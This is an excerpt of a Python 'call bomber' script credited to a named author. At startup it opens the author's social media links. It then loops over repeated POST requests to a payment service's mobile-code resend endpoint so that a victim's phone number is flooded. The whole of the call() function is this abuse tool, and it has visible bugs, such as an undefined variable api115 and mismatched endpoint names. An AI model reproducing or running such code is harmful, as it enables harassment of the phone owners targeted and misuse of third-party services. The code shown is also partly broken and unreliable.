...
def info():
    sort.clear()
    print('    WELCOME TO MIZANUR CALL_BOMBER TOOL          ')
    time.sleep(4)
    sort.clear()
    print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN MESSANGER GROUP ... ")
    os.system("xdg-open https://t.me/me_ha_di");time.sleep(2)
    print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]REVIEW TOOL OWNER ... ")
    os.system("xdg-open https://www.facebook.com/mdmizanurk6?mibextid=ZbWKwL");time.sleep(2)
    print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN CHANNEL ... ")
    os.system("xdg-open https://t.me/googlevoiceR4");time.sleep(2)
...
def clear():
    ...
    print(logo)
    print(22*f'{Q} -')
    print(f' {dt} CODER    : Md Mizanur k')
    print(f' {dt} Facebook : mdmizanurk6')
    print(22*' -')
#-------line-------------#
def line():
    print(22*' -')
...
def call():
  ...
  for i in range(lmt):
    ...
    api11 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    ...
    requests.post(api11, headers=headers, json=data)
    api12 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    ...
    requests.post(api12, headers=headers, json=data)
    api13 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    ...
    requests.post(api13, headers=headers, json=data)
    api14 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    ...
    requests.post(api14, headers=headers, json=data)
    api15 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    ...
    requests.post(api115, headers=headers, json=data)
    api16 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    ...
    requests.post(api15, headers=headers, json=data)
